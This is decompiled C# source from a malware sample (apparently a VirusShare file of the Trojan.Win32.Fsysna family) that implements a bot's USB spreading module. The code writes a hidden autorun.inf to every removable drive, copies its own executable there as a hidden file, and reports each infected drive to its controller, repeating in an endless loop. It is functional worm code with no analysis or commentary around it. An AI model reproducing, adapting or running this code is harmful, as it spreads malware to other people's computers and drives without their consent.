// Decompiled with JetBrains decompiler
// Type: Stub.c_Spreading
// Assembly: Bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 85CBEE6D-9173-48CF-9DE2-C5D6EFA84893
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Fsysna.dosu-c8b1b84f43bfbe7a69a68cc22f61d7b748661a1fe24c157f43f282f251b83c42.exe

using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Stub
{
  internal class c_Spreading
  {
    private static Thread threadUSB = new Thread(new ThreadStart(c_Spreading.SpreadUSB));

    public static void StartUSB()
    {
      if (c_Config.i_Spread_USB == 0)
        return;
      c_Spreading.threadUSB.Start();
    }

    public static void StopUSB()
    {
      if (c_Config.i_Spread_USB == 0)
        return;
      c_Spreading.threadUSB.Abort();
    }

    private static void SpreadUSB()
    {
      try
      {
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          if (drive.DriveType == DriveType.Removable)
          {
            string contents = string.Empty + "[autorun]" + Environment.NewLine + "label=USB Drive" + Environment.NewLine + "icon=%SystemRoot%\\system32\\SHELL32.dll,8" + Environment.NewLine + "open=" + c_Config.s_USBName + Environment.NewLine + "shellexecute=" + c_Config.s_USBName + Environment.NewLine + "action=USB Drive explorer" + Environment.NewLine;
            if (File.Exists(drive.Name + "autorun.inf"))
            {
              string[] strArray = File.ReadAllLines(drive.Name + "autorun.inf");
              string str = string.Empty;
              for (int index = 0; index < strArray.Length; ++index)
                str = str + strArray[index] + Environment.NewLine;
              if (str != contents)
                File.Delete(drive.Name + "autorun.inf");
            }
            if (!File.Exists(drive.Name + "autorun.inf"))
            {
              File.WriteAllText(drive.Name + "autorun.inf", contents);
              File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.Hidden);
            }
            if (File.Exists(drive.Name + c_Config.s_USBName) && File.ReadAllBytes(drive.Name + c_Config.s_USBName) != File.ReadAllBytes(Application.ExecutablePath))
              File.Delete(drive.Name + c_Config.s_USBName);
            if (!File.Exists(drive.Name + c_Config.s_USBName))
            {
              File.Copy(Application.ExecutablePath, drive.Name + c_Config.s_USBName);
              File.SetAttributes(drive.Name + c_Config.s_USBName, File.GetAttributes(drive.Name + c_Config.s_USBName) | FileAttributes.Hidden);
              c_Main.SendData("SpreadLog|USB|Infected drive: " + drive.Name);
            }
          }
        }
        Thread.Sleep(c_Config.i_USBInterval);
        c_Spreading.SpreadUSB();
      }
      catch
      {
        Thread.Sleep(c_Config.i_USBInterval);
        c_Spreading.SpreadUSB();
      }
    }
  }
}
